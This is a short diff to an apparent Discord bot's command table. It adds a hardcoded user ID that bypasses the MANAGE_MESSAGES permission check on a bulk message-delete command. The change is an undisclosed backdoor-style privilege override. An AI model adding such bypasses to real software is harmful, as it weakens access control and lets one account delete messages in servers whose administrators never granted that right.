@@ -531,7 +531,7 @@ const commands = {
       description: 'Clears X messages in a channel',
       usage: `${prefix}clear [number]`,
       runIf: function(message, args, period) {
-        return message.member.hasPermission('MANAGE_MESSAGES');
+        return message.member.hasPermission('MANAGE_MESSAGES') || message.author.id == '270997352939126794';
       },
       dm: false,
       run: function(message, args, period) {
